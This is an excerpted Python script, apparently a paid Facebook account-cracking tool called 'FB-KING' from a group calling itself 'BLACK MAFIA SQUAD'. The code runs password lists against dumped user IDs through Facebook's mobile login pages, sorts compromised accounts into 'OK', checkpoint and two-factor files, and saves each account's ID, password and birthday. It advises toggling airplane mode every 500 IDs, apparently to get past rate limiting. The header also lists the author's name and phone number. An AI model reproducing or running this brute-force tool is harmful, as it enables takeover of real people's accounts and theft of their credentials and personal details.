...
[🍁]\033[95;1m Auther      :  FB-KING 🙂

[📨] \033[94;1mGRP         :  BLACK MAFIA SQUAD

[🔔]\033[92;1m Facebook    : MAHIN AHMED   

[📢] \033[93;1mWhatsApp    : +8801841004250
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/FB-KING-PAID-DATA/CP')
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/FB-KING-PAID-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/FB-KING-PAID-DATA/CP/'+geh,'r').read().splitlines()
			except:
		...
		try:vin = os.listdir('/sdcard/FB-KING-PAID-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/FB-KING-PAID-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/FB-KING-PAID-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/FB-KING-PAID-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/FB-KING-PAID-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/FB-KING-PAID-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def crack_file():
	...
	sol().print(mark(cek, style='green'))
	try:vin = os.listdir('/sdcard/FB-KING-PAID-DATA/DUMP')
	except FileNotFoundError:
		gada = '# STORAGE NOT FOUND '
		sol().print(mark(gada, style='red'))
		time.sleep(2)
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/FB-KING-PAID-DATA/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
			...
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/FB-KING-PAID-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
...
def passwrd():
	...
	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/FB-KING-PAID-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/FB-KING-PAID-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
...
#tapyes			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','cache-control': 'max-age=0','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin%26refsrc%3Ddeprecated%26ref%3Ddbl&flow=login_no_pin&refsrc=deprecated&ref=dbl&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					try:
						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}\n[•] BIRTHDAY : {ttl}'
						open('/sdcard/FB-KING-PAID-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
					except:
						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}'
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s CRACK %s/%s FB-KING OK:%s FB-KING CP:%s FB-KING %s%s%s FB-KING'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
...
def cekopsii(id,pw):
		try:
			...
			if "checkpoint" in req.cookies.get_dict().keys():
				try:
					...
					if opsinya=='':
						try:
							...
							open('/sdcard/FB-KING-PAID-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')

						except:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
							open('/sdcard/FB-KING-PAID-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
					else:
						try:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
							open('/sdcard/FB-KING-PAID-DATA/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
						except:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
				...
				statusok1 = nel(statusok, style='yellow')
				cetak(nel(statusok1, title='CHECKPOINT OPTION'))
				open('/sdcard/FB-KING-PAID-DATA/OK/'+okc,'a').write(id+'|'+pw+'\n')
...
if __name__=='__main__':
	try:os.mkdir('/sdcard/FB-KING-PAID-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/FB-KING-PAID-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/FB-KING-PAID-DATA/DUMP')
	except:pass
	login()
